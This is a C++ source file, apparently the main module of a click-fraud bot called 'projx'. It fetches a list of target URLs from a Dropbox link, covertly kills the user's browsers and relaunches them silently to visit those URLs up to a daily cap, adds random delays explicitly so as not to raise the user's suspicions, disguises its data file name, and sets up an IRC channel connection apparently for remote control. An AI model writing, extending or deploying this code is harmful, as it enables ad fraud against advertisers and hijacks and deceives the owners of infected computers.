#include "stdafx.h"

#include "main_prog.h"

#include "web_browser_info.h"
#include "web_browser_manager.h"
#include "click_record.h"

namespace projx {

	DWORD g_prev_proc_priority = 0;

	MainProg::MainProg() : click_records_file("projx_db.dat"), current_url(nullptr), last_used_browser(nullptr), extra_click_delay(0), start_browser_delay(0) {
		std::string current_dir;
		ProgError error = GetModuleDirectory(NULL, &current_dir);
		if (error == ErrorCodes::kSuccess) {
			current_dir = FileFormatPath(current_dir, false);
			std::ifstream fake_prog_file(current_dir + "/" + kFakeProgInfFile);
			if (fake_prog_file.is_open()) {
				std::string records_filename;
				fake_prog_file >> records_filename;
				fake_prog_file.close();
				click_records_file = File(records_filename + "_db.dat");
			}
		}
	}
	MainProg::~MainProg() {
		RequestShutdown();
		if (last_used_browser != nullptr) {
			delete last_used_browser;
			last_used_browser = nullptr;
		}
		DeleteClickRecordSet(loaded_urls);
		current_url = nullptr;
	}
	MainProg &MainProg::GetInstance() {
		static MainProg instance;
		return instance;
	}
	ProgError MainProg::RunFrame() {
		if (check_urls_timer.get_start_time() == 0 || check_urls_timer.HasTimePassed(kUpdUrlsDelay)) {
			check_urls_timer.set_start_time();
			ProgError error = UpdateClickUrls();
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
		}
		ProgError error = TryClickCurrentUrl();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		return ErrorCodes::kSuccess;
	}
	ProgError MainProg::TryClickCurrentUrl() {
		if (extra_click_delay == 0) {
			extra_click_delay = kClickRandDelayMin + (rand() % (kClickRandDelayMax - kClickRandDelayMin + 1));
		}
		if (click_timer.get_start_time() != 0 && !click_timer.HasTimePassed(kClickBaseDelay + extra_click_delay)) {
			return ErrorCodes::kSuccess;
		}
		extra_click_delay = 0;
		if (last_used_browser != nullptr && !last_used_browser->get_exe_name().empty()) {
			ProgError error = last_used_browser->TerminateSync();
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			*last_used_browser = WebBrowserInfo();
		}
		// Second delay after terminating the running browser to not raise the user's suspicions too much.
		if (start_browser_delay == 0) {
			start_browser_delay = kBrowserRandDelayMin + (rand() % (kBrowserRandDelayMax - kBrowserRandDelayMin + 1));
		}
		if (click_timer.get_start_time() != 0 && !click_timer.HasTimePassed(kClickBaseDelay + start_browser_delay)) {
			return ErrorCodes::kSuccess;
		}
		start_browser_delay = 0;
		WebBrowserInfo preferred_browser;
		ProgError error = WebBrowserManager::GetInstance().GetPreferred(&preferred_browser);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		std::vector<WebBrowserInfo> unpreferred_browsers, not_running_browsers;
		WebBrowserInfo chosen_browser;
		for (const auto &it : WebBrowserManager::GetInstance().get_web_browsers()) {
			bool running, dir_exists;
			if (FileDirExists(it.second->get_main_dir(), &dir_exists) == ErrorCodes::kSuccess && it.second->IsRunning(&running) == ErrorCodes::kSuccess && dir_exists) {
				if (!running) {
					not_running_browsers.push_back(*it.second);
				}
				if (preferred_browser != *it.second) {
					unpreferred_browsers.push_back(*it.second);
					if (!running) {
						chosen_browser = *it.second;
						break;
					}
				}
			}
		}
		if (chosen_browser.get_exe_name().empty()) {
			if (!not_running_browsers.empty()) {
				chosen_browser = not_running_browsers[0];
			}
			else if (!unpreferred_browsers.empty()) {
				for (auto &it : unpreferred_browsers) {
					error = it.TerminateSync();
					if (error != ErrorCodes::kSuccess) {
						continue;
					}
					chosen_browser = it;
					break;
				}
			}
			else {
				chosen_browser = preferred_browser;
				error = chosen_browser.TerminateSync();
				if (error != ErrorCodes::kSuccess) {
					return error;
				}
			}
		}
		time_t cur_record_time = current_url != nullptr ? mktime(&current_url->get_last_click_date()) : 0, current_time = TimeGetInGm();
		if (cur_record_time == -1 || current_time == -1 || current_time < cur_record_time) {
			return ErrorCodes::kFailedApiCall;
		}
		for (auto &it : loaded_urls) {
			time_t record_time = mktime(&it->get_last_click_date());
			if (record_time != -1 && (current_time - record_time) > kDaySeconds) {
				((ClickRecord&)it).ResetClicks();
			}
		}
		if (current_url == nullptr || current_url->get_times_clicked() >= kClickMaxTimes && (current_time - cur_record_time) <= kDaySeconds) {
			for (auto &it : loaded_urls) {
				time_t record_time = mktime(&it->get_last_click_date());
				if (it->get_times_clicked() < kClickMaxTimes || record_time != -1 && (current_time - record_time) > kDaySeconds) {
					current_url = it;
					break;
				}
			}
		}
		if (current_url == nullptr || current_url->get_times_clicked() >= kClickMaxTimes) {
			return ErrorCodes::kSuccess;
		}
		error = chosen_browser.StartSilent(current_url->get_url());
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		click_timer.set_start_time();
		if (last_used_browser == nullptr) {
			last_used_browser = new WebBrowserInfo();
		}
		*last_used_browser = chosen_browser;
		error = current_url->IncrementClicks();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}

		// Ensures that a click was not missed:
		error = SaveClickRecords();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}

		return ErrorCodes::kSuccess;
	}
	IrcConnectParams MainProg::GetIrcParams() const {
		IrcConnectParams params;
		params.channel = "#PXNET_MAIN";
		params.host = "chat.freenode.net";
		params.port = 6665;
		return params;
	}
	std::string MainProg::GetLibListUrl() const {
		// TODO Uncomment
		return "";//"https://www.dropbox.com/s/ehukduws2mxkrfv/main_prog_libs.txt?dl=1";
	}
	ProgError MainProg::Stop() {
		ProgError error = Client::Stop();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		error = SaveClickRecords();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		if (last_used_browser != nullptr) {
			error = last_used_browser->TerminateSync();
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			delete last_used_browser;
			last_used_browser = nullptr;
		}
		extra_click_delay = start_browser_delay = 0;
		return ErrorCodes::kSuccess;
	}
	ProgError MainProg::UpdateClickUrls() {
		ProgError error = SaveClickRecords();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		ClickRecord *cr = current_url == nullptr ? nullptr : new ClickRecord(*current_url);
		DeleteClickRecordSet(loaded_urls);
		current_url = nullptr;
		UrlDataBuf url_buf;
		error = get_file_downloader()->DownloadUrl("https://www.dropbox.com/s/bkalqcq020al9dw/click_urls.txt?dl=1", &url_buf);
		if (error != ErrorCodes::kSuccess) {
			current_url = nullptr;
			if (cr != nullptr) {
				delete cr;
				cr = nullptr;
			}
			return error;
		}
		std::stringstream list_stream;
		char *list_buf = new char[url_buf.get_data_sz() + 1]{ '\0' };
		if (list_buf == nullptr) {
			current_url = nullptr;
			if (cr != nullptr) {
				delete cr;
				cr = nullptr;
			}
			return ErrorCodes::kOutOfMem;
		}
		memcpy(list_buf, url_buf.get_data(), url_buf.get_data_sz());
		list_stream << list_buf;
		while (list_stream.good()) {
			char url[2083 + 1]{ '\0' };  // IE's URL size limit
			list_stream.getline(url, sizeof(url));
			const std::string url_str = StrReplaceAll(url, "\r", "");
			if (url_str.empty()) {
				continue;
			}
			loaded_urls.insert(new ClickRecord(url_str));
		}
		delete[] list_buf;
		list_buf = nullptr;
		if (click_records_file.Exists()) {
			ClickRecordSet stored_urls;
			ProgError error = ReadClickRecords(click_records_file, &stored_urls);
			if (error != ErrorCodes::kSuccess) {
				DeleteClickRecordSet(stored_urls);
				current_url = nullptr;
				if (cr != nullptr) {
					delete cr;
					cr = nullptr;
				}
				return error;
			}
			for (ClickRecordSet::iterator it = loaded_urls.begin(); it != loaded_urls.end(); ++it) {
				ClickRecordSet::iterator found_click = stored_urls.find(*it);
				if (found_click != stored_urls.end() && (*it)->get_times_clicked() == 0) {
					**it = **found_click;
				}
			}
			DeleteClickRecordSet(stored_urls);
		}
		if (cr != nullptr) {
			ClickRecordSet::iterator found_url = loaded_urls.find(cr);
			current_url = found_url == loaded_urls.end() ? nullptr : *found_url;
			delete cr;
			cr = nullptr;
		}
		return ErrorCodes::kSuccess;
	}
	ProgError MainProg::SaveClickRecords() {
		ProgError error = WriteClickRecords(click_records_file, loaded_urls);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		return ErrorCodes::kSuccess;
	}

}  // namespace projx
